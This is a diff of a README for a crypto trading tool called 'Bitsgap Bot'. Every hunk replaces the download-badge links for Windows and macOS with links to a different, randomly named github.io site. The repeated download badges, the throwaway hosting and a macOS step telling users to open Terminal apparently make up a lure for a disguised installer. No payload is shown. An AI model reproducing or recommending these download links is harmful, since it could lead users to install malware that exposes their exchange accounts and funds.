@@ -25,7 +25,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Bitsgap_Bot-6C5CE6?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)
+[![Download](https://img.shields.io/badge/⬇_Download_Bitsgap_Bot-6C5CE6?style=for-the-badge)](https://beauticianblaze.github.io/DownloadWin/)
 
 </div>
 
@@ -58,9 +58,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beauticianblaze.github.io/DownloadWin/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beauticianblaze.github.io/DownloadMac/)
 
 </div>
 
@@ -73,7 +73,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Bitsgap_Bot-6C5CE6?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)
+[![Download](https://img.shields.io/badge/⬇_Download_Bitsgap_Bot-6C5CE6?style=for-the-badge)](https://beauticianblaze.github.io/DownloadWin/)
 
 </div>
 
@@ -116,7 +116,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beauticianblaze.github.io/DownloadMac/)
 
 1. Click the badge above → download macOS package
 2. Open **Terminal** (`⌘ + Space` → Terminal → Enter)
@@ -141,7 +141,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Bitsgap_Bot-6C5CE6?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)
+[![Download](https://img.shields.io/badge/⬇_Download_Bitsgap_Bot-6C5CE6?style=for-the-badge)](https://beauticianblaze.github.io/DownloadWin/)
 
 </div>
 
